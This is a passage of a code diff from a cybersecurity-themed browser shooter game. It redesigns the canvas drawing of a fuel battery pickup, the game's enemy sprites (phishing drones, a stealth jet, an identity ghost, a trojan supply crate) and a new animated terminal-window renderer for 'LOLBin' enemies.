-    CX.fillStyle='#74ff88'; CX.fillRect(-fb.w/2+6,-fb.h/2+5,(fb.w-12)*0.88,5);
-    CX.fillStyle=pulse?'#ffffff':'#74ff88'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText(T('g_fuel'),0,5);
-    CX.fillStyle='#2a5530'; CX.fillRect(-4,-fb.h/2-7,8,8); CX.fillStyle='#3a7a40'; CX.fillRect(-2,-fb.h/2-9,4,3);
-    CX.strokeStyle=pulse?'#74ff88':'#2a5a30'; CX.lineWidth=2; CX.strokeRect(-fb.w/2,-fb.h/2,fb.w,fb.h);
-    CX.strokeStyle='rgba(255,255,255,0.09)'; CX.lineWidth=1.3;
-    CX.beginPath(); CX.moveTo(-9,fb.h/2); CX.lineTo(-4,fb.h/2+11); CX.moveTo(9,fb.h/2); CX.lineTo(4,fb.h/2+11); CX.stroke();
+    if(!fb.alive) continue;
+    const sy=w2s(fb.wy); if(sy<-60||sy>VH+60) continue;
+    const pulse=fb.pulse>0;
+    const hw=fb.w/2, hh=fb.h/2;
+    CX.save(); CX.translate(fb.x,sy);
+
+    // ── Drop shadow ──────────────────────────────────────────────────
+    CX.fillStyle='rgba(0,0,0,0.28)'; CX.fillRect(-hw+2,hh+1,fb.w+6,4);
+
+    // ── Negative terminal cap (left end) ─────────────────────────────
+    CX.fillStyle='#2a2a2e';
+    CX.beginPath(); CX.roundRect(-hw,-hh+2,7,fb.h-4,2); CX.fill();
+    CX.strokeStyle='rgba(80,80,90,0.7)'; CX.lineWidth=0.7; CX.stroke();
+    // Negative symbol
+    CX.strokeStyle='rgba(140,140,150,0.8)'; CX.lineWidth=1.2;
+    CX.beginPath(); CX.moveTo(-hw+1.8,0); CX.lineTo(-hw+5.2,0); CX.stroke();
+
+    // ── Positive terminal nub (right end) ────────────────────────────
+    const posCol=pulse?'#a0ffb8':'#74ff88';
+    CX.fillStyle=posCol;
+    CX.beginPath(); CX.roundRect(hw-1,-hh+6,7,fb.h-12,2); CX.fill();
+    if(pulse){ CX.shadowBlur=10; CX.shadowColor='#74ff88'; CX.fill(); CX.shadowBlur=0; }
+    // Plus symbol
+    CX.strokeStyle=pulse?'#fff':'rgba(0,80,0,0.9)'; CX.lineWidth=1;
+    CX.beginPath(); CX.moveTo(hw+1.8,0); CX.lineTo(hw+5.2,0); CX.stroke();
+    CX.beginPath(); CX.moveTo(hw+3.5,-1.7); CX.lineTo(hw+3.5,1.7); CX.stroke();
+
+    // ── Main battery body (between caps) ─────────────────────────────
+    const bodyGrad=CX.createLinearGradient(0,-hh,0,hh);
     if(pulse){
-      CX.globalAlpha=fb.pulse*2.8; CX.beginPath(); CX.arc(0,0,fb.w*0.78,0,TAU); CX.strokeStyle='#74ff88'; CX.lineWidth=2.2; CX.stroke();
-      CX.globalAlpha=fb.pulse*1.4; CX.beginPath(); CX.arc(0,0,fb.w*1.1,0,TAU); CX.stroke();
+      bodyGrad.addColorStop(0,'#1a4228'); bodyGrad.addColorStop(0.35,'#22583a');
+      bodyGrad.addColorStop(0.65,'#1e4e34'); bodyGrad.addColorStop(1,'#122c1e');
+    } else {
+      bodyGrad.addColorStop(0,'#111e16'); bodyGrad.addColorStop(0.35,'#1a2e22');
+      bodyGrad.addColorStop(0.65,'#162a1e'); bodyGrad.addColorStop(1,'#0d1a10');
     }
-    if(fb.fromBoss){ CX.globalAlpha=0.7+0.3*Math.sin(Date.now()*0.012); CX.fillStyle='#ff7a00'; CX.beginPath(); CX.arc(fb.w/2-5,-fb.h/2+5,3,0,TAU); CX.fill(); }
-    CX.shadowBlur=0; CX.textAlign='left'; CX.globalAlpha=1; CX.restore();
+    CX.fillStyle=bodyGrad;
+    CX.beginPath(); CX.roundRect(-hw+7,-hh,fb.w-10,fb.h,3); CX.fill();
+
+    // ── Metallic edge highlight (top edge) ───────────────────────────
+    CX.strokeStyle='rgba(120,220,140,0.18)'; CX.lineWidth=0.8;
+    CX.beginPath(); CX.moveTo(-hw+9,-hh); CX.lineTo(hw-4,-hh); CX.stroke();
+
+    // ── Battery label stripe ──────────────────────────────────────────
+    // Center band — brand stripe
+    CX.fillStyle=pulse?'rgba(116,255,136,0.12)':'rgba(50,120,70,0.18)';
+    CX.fillRect(-18,-hh,36,fb.h);
+
+    // ── 4 charge segment bars ─────────────────────────────────────────
+    // Bars go left-to-right, each 6px wide, 2px gap, starting at x=-28
+    const barW=6, barH=fb.h-10, barGap=2;
+    const totalBars=4;
+    const barStartX=-hw+13;
+    // Charge level: animated for pulse, 3/4 filled normally
+    const chargeAnim=(Math.sin(_t*2.4)+1)*0.5; // 0→1 oscillate
+    const litBars=pulse?4:2+Math.floor(chargeAnim*2); // pulse=all 4 lit; idle=2-3
+
+    for(let bi=0;bi<totalBars;bi++){
+      const bx=barStartX+bi*(barW+barGap);
+      const lit=bi<litBars;
+      // Bar background (slot)
+      CX.fillStyle='rgba(0,0,0,0.55)'; CX.fillRect(bx,-barH/2,barW,barH);
+      // Filled portion
+      if(lit){
+        const barGradB=CX.createLinearGradient(bx,-barH/2,bx,-barH/2+barH);
+        if(pulse){
+          // Animated charge wave: each bar fills sequentially
+          const wavePhase=(_t*3-bi*0.22)%1;
+          barGradB.addColorStop(0,'rgba(180,255,200,0.95)');
+          barGradB.addColorStop(wavePhase,'rgba(116,255,136,1)');
+          barGradB.addColorStop(1,'rgba(60,180,100,0.7)');
+        } else {
+          barGradB.addColorStop(0,'rgba(100,200,130,0.9)');
+          barGradB.addColorStop(1,'rgba(50,140,80,0.6)');
+        }
+        CX.fillStyle=barGradB; CX.fillRect(bx,-barH/2,barW,barH);
+        if(pulse){ CX.shadowBlur=6; CX.shadowColor='#74ff88'; }
+        CX.strokeStyle=pulse?'rgba(180,255,200,0.6)':'rgba(60,160,90,0.4)'; CX.lineWidth=0.5;
+        CX.strokeRect(bx,-barH/2,barW,barH); CX.shadowBlur=0;
+      } else {
+        // Unlit bar (dim outline only)
+        CX.strokeStyle='rgba(40,80,50,0.5)'; CX.lineWidth=0.5;
+        CX.strokeRect(bx,-barH/2,barW,barH);
+      }
+    }
+
+    // ── Lightning bolt symbol (center-right of label) ─────────────────
+    const boltX=18;
+    if(pulse){ CX.shadowBlur=14; CX.shadowColor='#74ff88'; }
+    CX.fillStyle=pulse?'#c8ffda':'#74ff88';
+    CX.beginPath();
+    CX.moveTo(boltX+1,-6); CX.lineTo(boltX-2,0.5); CX.lineTo(boltX+1.5,0.5);
+    CX.lineTo(boltX-1,6);  CX.lineTo(boltX+3,0); CX.lineTo(boltX-0.5,0);
+    CX.closePath(); CX.fill();
+    CX.shadowBlur=0;
+
+    // ── FUEL label ────────────────────────────────────────────────────
+    CX.fillStyle=pulse?'rgba(255,255,255,0.9)':'rgba(116,255,136,0.7)';
+    CX.font='bold 6px monospace'; CX.textAlign='center';
+    CX.fillText(T('g_fuel'),-10,hh-2);
+
+    // ── Outer body outline ────────────────────────────────────────────
+    CX.strokeStyle=pulse?'#74ff88':'rgba(50,130,70,0.55)'; CX.lineWidth=1.2;
+    CX.beginPath(); CX.roundRect(-hw+7,-hh,fb.w-10,fb.h,3); CX.stroke();
+    if(pulse){ CX.shadowBlur=12; CX.shadowColor='#74ff88'; CX.stroke(); CX.shadowBlur=0; }
+
+    // ── Pulse indicator dots (idle blinking) ──────────────────────────
+    if(!pulse){
+      const blinkA=0.4+0.35*Math.sin(_t*2.8+fb.x*0.05);
+      CX.fillStyle=`rgba(116,255,136,${blinkA})`;
+      CX.beginPath(); CX.arc(hw-8,-hh+3,1.4,0,TAU); CX.fill();
+    }
+
+    // ── Active refueling: energy transfer beam + electric arcs ────────
+    if(pulse){
+      // Upward energy beam toward player
+      const beamH=36+fb.pulse*42;
+      const bGrad=CX.createLinearGradient(0,-hh-beamH,0,-hh);
+      bGrad.addColorStop(0,'rgba(116,255,136,0)');
+      bGrad.addColorStop(0.55,'rgba(116,255,136,0.5)');
+      bGrad.addColorStop(1,'rgba(200,255,215,0.92)');
+      CX.fillStyle=bGrad; CX.fillRect(-2,-hh-beamH,4,beamH);
+      // Electric arc fringe (two arcs)
+      CX.strokeStyle=`rgba(116,255,136,${fb.pulse*1.7})`; CX.lineWidth=1;
+      for(let ai=0;ai<2;ai++){
+        const aR=7+ai*9+fb.pulse*8;
+        CX.beginPath(); CX.arc(0,-hh-14,aR,-Math.PI*0.82,-Math.PI*0.18); CX.stroke();
+      }
+      // Terminal-to-terminal arc flash
+      CX.strokeStyle=`rgba(180,255,200,${0.3+0.4*Math.sin(_t*18)})`; CX.lineWidth=0.8;
+      CX.beginPath();
+      const arcMidY=-Math.sin(_t*14)*3;
+      CX.moveTo(-hw+7,0); CX.quadraticCurveTo(0,arcMidY,hw-1,0); CX.stroke();
+      // Expanding pulse rings
+      CX.globalAlpha=Math.min(1,fb.pulse*2.4);
+      CX.strokeStyle='#74ff88'; CX.lineWidth=1.6;
+      CX.beginPath(); CX.arc(0,0,hw*0.68,0,TAU); CX.stroke();
+      CX.globalAlpha=Math.min(1,fb.pulse*1.2);
+      CX.lineWidth=1; CX.beginPath(); CX.arc(0,0,hw*1.02,0,TAU); CX.stroke();
+      CX.globalAlpha=1;
+    }
+
+    // ── Boss-phase marker (orange beacon, top-right) ───────────────────
+    if(fb.fromBoss){
+      CX.globalAlpha=0.65+0.35*Math.sin(_t*11);
+      CX.fillStyle='#ff7a00';
+      CX.beginPath(); CX.arc(hw-6,-hh+3,2.5,0,TAU); CX.fill();
+      CX.globalAlpha=1;
+    }
+
+    CX.textAlign='left'; CX.restore();
   }
 }
 
@@ -9916,28 +10169,97 @@ function drawEnemies(){
     CX.setLineDash([]); CX.restore();
   }
 
-  // ── Terminal window helper for LOLBin enemies ─────────────────────
-  function drawTerminalWindow(e,sy,titleText,promptText,promptCol,titleBarCol,cursorCol,extraLine){
+  // ── Terminal V2: authentic multi-line LOLBin renderer ────────────────
+  // ARCH: Replaces drawTerminalWindow() with a deep terminal experience.
+  // cfg: { bg, titleBg, title, border, cmdCol, outCol, lines[] }
+  // lines[]: each string drawn in cmdCol if starts with '>', else outCol.
+  // Lines revealed one-per-0.38s via e.t; cursor blinks on last active line.
+  function drawTerminalV2(e, cfg){
     const vis=canSeeE(e);
     const fc=e.hf>0?'#ffffff':null;
     const W2=e.w/2, H2=e.h/2;
-    const shimmer=vis?1:(0.08+0.06*Math.sin(Date.now()*0.004+e.x*0.05));
+    const shimmer=vis?1:(0.06+0.07*Math.sin(Date.now()*0.004+e.x*0.05));
     CX.globalAlpha=shimmer;
-    const blink=Math.floor(Date.now()/520)%2===0;
-    CX.fillStyle='rgba(0,0,0,0.38)'; CX.fillRect(-W2+3,H2-2,e.w,e.h);
-    CX.fillStyle=fc||'#0d0d0d';     CX.fillRect(-W2,-H2,e.w,e.h);
-    CX.fillStyle=fc||titleBarCol;   CX.fillRect(-W2,-H2,e.w,8);
-    ['#ff5f57','#ffbd2e','#28c840'].forEach((c,idx)=>{
-      CX.fillStyle=c; CX.beginPath(); CX.arc(-W2+5+idx*9,-H2+4,2.5,0,TAU); CX.fill();
+
+    // Drop shadow for depth
+    CX.fillStyle='rgba(0,0,0,0.55)'; CX.fillRect(-W2+4,H2,e.w,e.h*0.18);
+
+    // Window body
+    CX.fillStyle=fc||cfg.bg; CX.fillRect(-W2,-H2,e.w,e.h);
+
+    // Scanline texture (subtle horizontal bands)
+    if(vis){
+      CX.fillStyle='rgba(255,255,255,0.025)';
+      for(let sl=-H2+12;sl<H2;sl+=3){ CX.fillRect(-W2,sl,e.w,1); }
+    }
+
+    // Title bar
+    CX.fillStyle=fc||cfg.titleBg; CX.fillRect(-W2,-H2,e.w,11);
+
+    // Traffic light buttons
+    [[-W2+5,'#ff5f57'],[-W2+13,'#ffbd2e'],[-W2+21,'#28c840']].forEach(([bx,bc])=>{
+      CX.fillStyle=bc; CX.beginPath(); CX.arc(bx,-H2+5.5,3,0,TAU); CX.fill();
     });
-    CX.fillStyle='rgba(255,255,255,0.88)'; CX.font='5px monospace'; CX.textAlign='center';
-    CX.fillText(titleText,W2*0.28,-H2+6);
-    CX.fillStyle=promptCol; CX.font='9px monospace'; CX.textAlign='left';
-    CX.fillText(promptText,-W2+3,-H2+18);
-    if(blink&&vis){ CX.fillStyle=cursorCol; CX.fillRect(-W2+3+(promptText.length*3.5),-H2+11,4,7); }
-    if(extraLine){ CX.fillStyle='rgba(255,255,255,0.38)'; CX.font='5px monospace'; CX.fillText(extraLine,-W2+3,-H2+26); }
-    CX.strokeStyle=fc?fc:(vis?titleBarCol:'rgba(80,80,80,0.5)'); CX.lineWidth=1;
-    CX.strokeRect(-W2,-H2,e.w,e.h);
+
+    // Title text
+    CX.fillStyle='rgba(255,255,255,0.85)'; CX.font='5px monospace'; CX.textAlign='center';
+    CX.fillText(cfg.title, e.w*0.12, -H2+8);
+
+    // Code lines — revealed based on e.t (one per 0.38 s, min 1 when not visible)
+    const lines=cfg.lines;
+    const visLines=vis?Math.min(lines.length,Math.max(1,Math.floor(e.t/0.38)+1)):1;
+    const usableH=e.h-14; // below title bar
+    const lineH=Math.floor(usableH/lines.length);
+
+    CX.textAlign='left';
+    for(let i=0;i<visLines&&i<lines.length;i++){
+      const raw=lines[i];
+      const isCmd=raw.charCodeAt(0)===62; // '>'
+      const text=isCmd?raw.slice(1):raw;
+      const ly=-H2+12+i*lineH+lineH*0.72;
+      CX.fillStyle=fc||(isCmd?cfg.cmdCol:cfg.outCol);
+      CX.font='5px monospace';
+      // Clip to window width (approximate — trim to fit)
+      const maxChars=Math.floor((e.w-8)/3.15);
+      CX.fillText(text.slice(0,maxChars),-W2+4,ly);
+    }
+
+    // Blinking cursor on last active line
+    if(vis&&Math.floor(Date.now()/480)%2===0&&visLines>0){
+      const ci=Math.min(visLines-1,lines.length-1);
+      const rawC=lines[ci]||'';
+      const isCmd=rawC.charCodeAt(0)===62;
+      const text=isCmd?rawC.slice(1):rawC;
+      const maxChars=Math.floor((e.w-8)/3.15);
+      const trimLen=Math.min(text.length,maxChars);
+      const cly=-H2+12+ci*lineH+lineH*0.72;
+      CX.fillStyle=cfg.cmdCol;
+      CX.fillRect(-W2+4+trimLen*3.15,cly-5,2.5,6);
+    }
+
+    // Status badge bottom-right
+    if(vis){
+      const executing=visLines>=lines.length;
+      CX.fillStyle=executing?'rgba(0,30,0,0.8)':'rgba(20,12,0,0.8)';
+      CX.fillRect(W2-30,H2-9,30,9);
+      CX.fillStyle=executing?'#74ff88':'#ffd84d';
+      CX.font='5px monospace'; CX.textAlign='right';
+      CX.fillText(executing?'▶ EXEC':'◌ LOAD',W2-2,H2-2);
+    }
+
+    // Border
+    CX.strokeStyle=fc?fc:(vis?cfg.border:'rgba(55,55,55,0.45)');
+    CX.lineWidth=1.2; CX.strokeRect(-W2,-H2,e.w,e.h);
+
+    // Outer glow when revealed + executing
+    if(vis&&e.t>lines.length*0.38){
+      const gAlpha=0.18+0.08*Math.sin(Date.now()*0.006);
+      CX.shadowBlur=10; CX.shadowColor=cfg.border;
+      CX.strokeStyle=cfg.border+'88'; CX.lineWidth=1;
+      CX.strokeRect(-W2-1,-H2-1,e.w+2,e.h+2);
+      CX.shadowBlur=0;
+    }
+    CX.textAlign='left';
   }
 
   // ── Main enemy draw loop ──────────────────────────────────────────
@@ -9964,200 +10286,633 @@ function drawEnemies(){
 
     switch(e.type){
 
-      // ── Standard air threats ──────────────────────────────────────
-      case 'phishDrone':
-        CX.fillStyle=fc||'#ff7a00';
-        CX.fillRect(-14,-5,28,9); CX.fillRect(-22,-10,10,4); CX.fillRect(12,-10,10,4);
-        CX.fillRect(-22,5,10,4);  CX.fillRect(12,5,10,4);
-        CX.fillStyle='#ffd84d'; CX.fillRect(-5,-4,10,7);
-        CX.fillStyle='#222'; CX.font='bold 9px monospace'; CX.textAlign='center';
-        CX.fillText('@',0,2); break;
+      // ── Standard air threats — cinematic redesign ─────────────────
+      case 'phishDrone': {
+        // Quadrotor drone: X-frame arms + rotor discs + email payload body
+        const rotA=e.t*9; // rotor spin
+        CX.save(); CX.rotate(Math.PI/4);
+        CX.fillStyle=fc||'#cc5500'; CX.fillRect(-13,-2,26,4); CX.fillRect(-2,-13,4,26);
+        CX.restore();
+        // Rotor discs at arm tips
+        [[-10,-10],[10,-10],[-10,10],[10,10]].forEach(([rx,ry])=>{
+          CX.save(); CX.translate(rx,ry);
+          CX.fillStyle=`rgba(255,140,50,0.28)`; CX.beginPath(); CX.arc(0,0,5,0,TAU); CX.fill();
+          CX.strokeStyle=fc||'#ff8833'; CX.lineWidth=1.5;
+          CX.beginPath();
+          CX.moveTo(Math.cos(rotA)*5,Math.sin(rotA)*5);
+          CX.lineTo(Math.cos(rotA+Math.PI)*5,Math.sin(rotA+Math.PI)*5); CX.stroke();
+          CX.restore();
+        });
+        // Envelope body (payload)
+        CX.fillStyle=fc||'#bb4400'; CX.fillRect(-7,-5,14,10);
+        CX.strokeStyle=fc||'#ff8833'; CX.lineWidth=1; CX.strokeRect(-7,-5,14,10);
+        // Envelope flap triangle
+        CX.fillStyle=fc||'#ff7722';
+        CX.beginPath(); CX.moveTo(-7,-5); CX.lineTo(0,1); CX.lineTo(7,-5); CX.closePath(); CX.fill();
+        // @ symbol glow
+        CX.shadowBlur=vis?6:0; CX.shadowColor='#ffd080';
+        CX.fillStyle='#ffd08a'; CX.font='bold 7px monospace'; CX.textAlign='center';
+        CX.fillText('@',0,6); CX.shadowBlur=0; break;
+      }
 
-      case 'vishDrone':
-        CX.fillStyle=fc||'#ff62ff';
-        CX.fillRect(-13,-5,26,9); CX.fillRect(-21,-10,9,4); CX.fillRect(12,-10,9,4);
-        CX.fillRect(-21,5,9,4);   CX.fillRect(12,5,9,4);
-        CX.fillStyle='#ffc8ff'; CX.fillRect(-4,-3,8,6);
-        CX.fillStyle='#220022'; CX.font='bold 9px monospace'; CX.textAlign='center';
-        CX.fillText('☎',0,3); break;
+      case 'vishDrone': {
+        // Vishing: hexagonal antenna array with signal arc waves
+        CX.fillStyle=fc||'#cc00cc';
+        // Hexagonal body
+        CX.beginPath();
+        for(let vi=0;vi<6;vi++){const a=vi/6*TAU-Math.PI/6;CX.lineTo(Math.cos(a)*9,Math.sin(a)*9);}
+        CX.closePath(); CX.fill();
+        CX.strokeStyle=fc||'#ff88ff'; CX.lineWidth=1.2; CX.stroke();
+        // Signal arcs emanating from sides
+        if(vis){
+          const arcPh=e.t*3;
+          for(let ai=0;ai<3;ai++){
+            const arcR=7+ai*5+((arcPh*2)%5);
+            const aAlpha=Math.max(0,0.5-(ai*0.15));
+            CX.globalAlpha*=aAlpha;
+            CX.strokeStyle='#ff62ff'; CX.lineWidth=0.8;
+            CX.beginPath(); CX.arc(-8,0,arcR,-Math.PI*0.6,Math.PI*0.6); CX.stroke();
+            CX.beginPath(); CX.arc(8,0,arcR,Math.PI*0.4,Math.PI*1.6); CX.stroke();
+            CX.globalAlpha=shimmer;
+          }
+        }
+        // Phone icon centre
+        CX.fillStyle=fc||'#1a001a'; CX.fillRect(-3,-5,6,9);
+        CX.fillStyle='#ffc8ff'; CX.font='bold 6px monospace'; CX.textAlign='center';
+        CX.fillText('☎',0,2); break;
+      }
 
-      case 'nokNok':
-        CX.fillStyle=fc||'#ffaa00';
-        CX.beginPath(); CX.arc(0,0,12,0,TAU); CX.fill();
-        CX.strokeStyle='#ffe080'; CX.lineWidth=2; CX.stroke();
-        CX.fillStyle='#1a1000'; CX.font='bold 9px monospace'; CX.textAlign='center';
-        CX.fillText('🐱',0,3); break;
+      case 'nokNok': {
+        // Brute-force battering ram — reinforced metal cylinder + spike tip + "!!" indicator
+        // Body: rounded rectangle
+        CX.fillStyle=fc||'#996600';
+        CX.beginPath(); CX.roundRect(-11,-7,22,14,3); CX.fill();
+        // Metal banding
+        CX.strokeStyle=fc||'#ccaa44'; CX.lineWidth=1.2;
+        CX.beginPath(); CX.roundRect(-11,-7,22,14,3); CX.stroke();
+        for(const bx of [-5,5]){CX.beginPath();CX.moveTo(bx,-7);CX.lineTo(bx,7);CX.stroke();}
+        // Spike tip (forward — "up" direction)
+        CX.fillStyle=fc||'#ddbb55';
+        CX.beginPath(); CX.moveTo(-4,-7); CX.lineTo(0,-14); CX.lineTo(4,-7); CX.closePath(); CX.fill();
+        // "!!" brute-force indicator
+        CX.fillStyle='#ff4400'; CX.font='bold 7px monospace'; CX.textAlign='center';
+        CX.fillText('!!',0,3); break;
+      }
 
-      case 'stealthJet':
-        CX.fillStyle=fc||'#5060d8';
-        CX.beginPath(); CX.moveTo(0,-16); CX.lineTo(12,0); CX.lineTo(9,14);
-        CX.lineTo(0,10); CX.lineTo(-9,14); CX.lineTo(-12,0); CX.closePath(); CX.fill();
-        CX.fillStyle='#b0b8ff'; CX.beginPath(); CX.ellipse(0,-4,3.5,6,0,0,TAU); CX.fill();
-        if(!vis){ CX.fillStyle='rgba(80,96,216,0.32)'; CX.beginPath(); CX.ellipse(0,0,16,19,0,0,TAU); CX.fill(); }
-        break;
-
-      case 'aiMirage':
+      case 'stealthJet': {
+        // True B-2 flying-wing silhouette (angular delta, no tail)
+        const sCol=fc||(vis?'#3040b0':'#2030a0');
+        CX.fillStyle=sCol;
+        // Main wing body — flat angular W-shape
+        CX.beginPath();
+        CX.moveTo(0,-18);        // nose
+        CX.lineTo(16,2);         // starboard wingtip
+        CX.lineTo(12,8);         // starboard trailing
+        CX.lineTo(5,4);          // starboard inboard
+        CX.lineTo(0,10);         // tail center
+        CX.lineTo(-5,4);         // port inboard
+        CX.lineTo(-12,8);        // port trailing
+        CX.lineTo(-16,2);        // port wingtip
+        CX.closePath(); CX.fill();
+        // Radar-absorbing material facets (subtle texture panels)
+        CX.strokeStyle=vis?'rgba(100,120,220,0.35)':'rgba(40,50,120,0.2)'; CX.lineWidth=0.8;
+        CX.beginPath(); CX.moveTo(0,-18); CX.lineTo(-8,3); CX.moveTo(0,-18); CX.lineTo(8,3);
+        CX.moveTo(-8,3); CX.lineTo(-16,2); CX.moveTo(8,3); CX.lineTo(16,2); CX.stroke();
+        // Cockpit sensor (tiny)
+        CX.fillStyle=vis?'#6070e0':'rgba(60,70,180,0.3)';
+        CX.beginPath(); CX.ellipse(0,-10,2,3.5,0,0,TAU); CX.fill();
+        // Stealth shimmer halo when hidden
         if(!vis){
-          CX.fillStyle='#74ff88'; CX.beginPath(); CX.arc(0,0,14,0,TAU); CX.fill();
-          CX.strokeStyle='#d8ffb6'; CX.lineWidth=2; CX.stroke();
-          CX.fillStyle='#000'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('OK',0,3);
-        } else {
-          CX.fillStyle=fc||'#b86bff'; CX.beginPath(); CX.arc(0,0,14,0,TAU); CX.fill();
-          CX.strokeStyle='#e0b0ff'; CX.lineWidth=2; CX.stroke();
-          CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('FAKE',0,3);
+          const halo=0.08+0.06*Math.sin(Date.now()*0.005);
+          CX.fillStyle=`rgba(60,80,255,${halo})`; CX.beginPath(); CX.ellipse(0,-4,20,14,0,0,TAU); CX.fill();
         }
         break;
+      }
 
-      case 'idGhost':
-        CX.fillStyle=fc||'#ff62ff';
-        CX.beginPath(); CX.arc(0,-5,12,Math.PI,0);
-        CX.lineTo(12,12); CX.lineTo(8,8); CX.lineTo(4,12); CX.lineTo(0,8);
-        CX.lineTo(-4,12); CX.lineTo(-8,8); CX.lineTo(-12,12); CX.closePath(); CX.fill();
-        CX.fillStyle='#fff'; CX.fillRect(-5,-9,3,3); CX.fillRect(2,-9,3,3); break;
+      case 'aiMirage': {
+        // Dual-state AI deception: green legit when hidden, purple glitchy when revealed
+        if(!vis){
+          // Disguised as a friendly sensor node
+          CX.fillStyle='#1a3a20';
+          CX.beginPath(); CX.arc(0,0,13,0,TAU); CX.fill();
+          CX.strokeStyle='#74ff88'; CX.lineWidth=2; CX.stroke();
+          CX.fillStyle='#74ff88'; CX.font='bold 8px monospace'; CX.textAlign='center';
+          CX.fillText('OK',0,3);
+          // Gentle pulse
+          const gP=0.4+0.15*Math.sin(Date.now()*0.004);
+          CX.strokeStyle=`rgba(116,255,136,${gP})`; CX.lineWidth=1;
+          CX.beginPath(); CX.arc(0,0,17,0,TAU); CX.stroke();
+        } else {
+          // Revealed as glitchy malicious AI
+          CX.fillStyle=fc||'#6a00c0';
+          CX.beginPath(); CX.arc(0,0,14,0,TAU); CX.fill();
+          // Glitch artifact bands
+          const gTime=Math.floor(Date.now()/120)%4;
+          CX.fillStyle='rgba(200,80,255,0.5)';
+          if(gTime===0) CX.fillRect(-14,-3,28,3);
+          if(gTime===2) CX.fillRect(-14,2,28,2);
+          CX.strokeStyle=fc||'#c050ff'; CX.lineWidth=2;
+          CX.beginPath(); CX.arc(0,0,14,0,TAU); CX.stroke();
+          // "FAKE" label with static noise
+          CX.fillStyle='#fff'; CX.font='bold 7px monospace'; CX.textAlign='center'; CX.fillText('FAKE',0,3);
+          CX.fillStyle='rgba(200,80,255,0.3)'; CX.font='5px monospace';
+          CX.fillText('AI',0,-5);
+        }
+        break;
+      }
 
-      case 'tokenDrone':
-        CX.fillStyle=fc||'#ffd84d'; CX.beginPath(); CX.arc(0,0,11,0,TAU); CX.fill();
-        CX.strokeStyle='#fff1a6'; CX.lineWidth=2; CX.stroke();
-        CX.fillStyle='#222'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('T',0,4); break;
+      case 'idGhost': {
+        // Identity ghost: phantom shape with credential symbols
+        CX.fillStyle=fc||'#cc00cc';
+        // Ghost body
+        CX.beginPath(); CX.arc(0,-4,11,Math.PI,0);
+        CX.lineTo(11,10); CX.lineTo(7,6); CX.lineTo(4,10); CX.lineTo(0,6);
+        CX.lineTo(-4,10); CX.lineTo(-7,6); CX.lineTo(-11,10); CX.closePath(); CX.fill();
+        CX.strokeStyle=fc||'#ff88ff'; CX.lineWidth=1; CX.stroke();
+        // Hollow eyes (credential theft)
+        CX.fillStyle='#fff'; CX.fillRect(-6,-8,4,4); CX.fillRect(2,-8,4,4);
+        CX.fillStyle='#300030'; CX.fillRect(-5,-7,2,2); CX.fillRect(3,-7,2,2);
+        // ID card hovering below (stolen identity)
+        if(vis){
+          CX.fillStyle='rgba(255,130,255,0.2)'; CX.fillRect(-7,8,14,6);
+          CX.strokeStyle='#ff88ff'; CX.lineWidth=0.8; CX.strokeRect(-7,8,14,6);
+          CX.fillStyle='#ff88ff'; CX.font='5px monospace'; CX.textAlign='center'; CX.fillText('ID',0,13);
+        }
+        break;
+      }
 
-      case 'supplyDrone':
-        CX.fillStyle=fc||'#88ff55'; CX.beginPath(); CX.arc(0,0,11,0,TAU); CX.fill();
-        CX.strokeStyle='#c8ffa4'; CX.lineWidth=2; CX.stroke();
-        CX.fillStyle='#0a1a02'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('S',0,3); break;
+      case 'tokenDrone': {
+        // JWT token vault drone — hexagonal with spinning lock + key
+        const lkA=e.t*1.8; // lock dial rotation
+        // Hex vault body
+        CX.fillStyle=fc||'#b89000';
+        CX.beginPath();
+        for(let vi=0;vi<6;vi++){const a=vi/6*TAU;CX.lineTo(Math.cos(a)*11,Math.sin(a)*11);}
+        CX.closePath(); CX.fill();
+        CX.strokeStyle=fc||'#ffe066'; CX.lineWidth=1.5; CX.stroke();
+        // Spinning lock dial
+        CX.save(); CX.rotate(lkA);
+        CX.strokeStyle=fc||'#ffe066'; CX.lineWidth=1.2;
+        CX.beginPath(); CX.arc(0,0,5,0,TAU); CX.stroke();
+        CX.beginPath(); CX.moveTo(0,-5); CX.lineTo(0,-8); CX.stroke(); // shackle
+        CX.restore();
+        // Key notch indicator
+        CX.fillStyle=fc||'#ffe066'; CX.fillRect(-1,-3,2,6);
+        CX.fillRect(-3,0,6,2); break;
+      }
 
-      case 'cryptoJet':
-        CX.fillStyle=fc||'#2af0d0';
-        CX.beginPath(); CX.moveTo(0,-16); CX.lineTo(12,1); CX.lineTo(9,14);
-        CX.lineTo(0,10); CX.lineTo(-9,14); CX.lineTo(-12,1); CX.closePath(); CX.fill();
-        CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('₿',0,3); break;
+      case 'supplyDrone': {
+        // Trojanized supply crate: normal-looking box with hidden payload
+        CX.fillStyle=fc||'#447733';
+        CX.fillRect(-12,-10,24,18); // crate body
+        CX.strokeStyle=fc||'#88cc66'; CX.lineWidth=1.2; CX.strokeRect(-12,-10,24,18);
+        // Crate straps/bands
+        CX.strokeStyle=fc||'#66aa44'; CX.lineWidth=1;
+        CX.beginPath(); CX.moveTo(0,-10); CX.lineTo(0,8); CX.stroke(); // vertical strap
+        // Chain links connecting (supply chain)
+        if(vis){
+          for(let ci=0;ci<3;ci++){
+            const cx2=-18+ci*18; const cy2=-2;
+            CX.strokeStyle='rgba(180,255,100,0.5)'; CX.lineWidth=0.8;
+            CX.beginPath(); CX.arc(cx2<-12?-16:cx2>12?16:cx2,cy2,2.5,0,TAU); CX.stroke();
+          }
+          // Skull hidden inside (trojan payload — visible only when near player)
+          const md=Math.hypot(e.x-PL.x,0);
+          if(md<80){
+            CX.fillStyle='rgba(255,50,50,0.6)'; CX.font='8px monospace'; CX.textAlign='center';
+            CX.fillText('☠',0,2);
+          } else {
+            CX.fillStyle='#aaddaa'; CX.font='bold 7px monospace'; CX.textAlign='center';
+            CX.fillText('S',0,3);
+          }
+        } else {
+          CX.fillStyle='#aaddaa'; CX.font='bold 7px monospace'; CX.textAlign='center';
+          CX.fillText('S',0,3);
+        }
+        break;
+      }
 
-      case 'wiperJet':
-        CX.fillStyle=fc||'#c850ff';
